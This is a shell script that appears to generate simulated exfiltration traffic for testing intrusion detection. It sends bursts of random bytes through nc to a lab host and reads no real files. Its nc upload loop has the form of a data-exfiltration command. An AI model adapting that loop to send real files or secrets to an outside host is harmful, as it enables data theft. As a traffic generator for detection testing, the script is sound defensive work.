#!/bin/sh
# NEXA test-attack: Exfiltration — bulk outbound data transfer (large high-entropy
# uploads) to the victim, mimicking data being siphoned off a device. Traffic-only:
# generates random bytes, touches no real files (iot_test lane).
echo "[EXFIL] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
EXFIL_PORT="${EXFIL_PORT:-80}"
END=$(($(date +%s) + DURATION))

# Intensity -> chunk size (bytes) per upload / uploads per burst / pause.
case "$INTENSITY" in
    low)    CHUNK=262144;  BURST=2; SLEEP_MAX=5 ;;
    high)   CHUNK=4194304; BURST=6; SLEEP_MAX=2 ;;
    *)      CHUNK=1048576; BURST=4; SLEEP_MAX=3 ;;  # medium
esac

while [ "$(date +%s)" -lt "$END" ]; do
    i=0
    while [ "$i" -lt "$BURST" ]; do
        # Large high-entropy "stolen data" upload (random bytes) -> victim
        head -c "$CHUNK" /dev/urandom \
            | nc -w 5 "$TARGET" "$EXFIL_PORT" 2>/dev/null
        i=$((i + 1))
    done
    sleep $((RANDOM % SLEEP_MAX + 1))
done
echo "[EXFIL] Done."
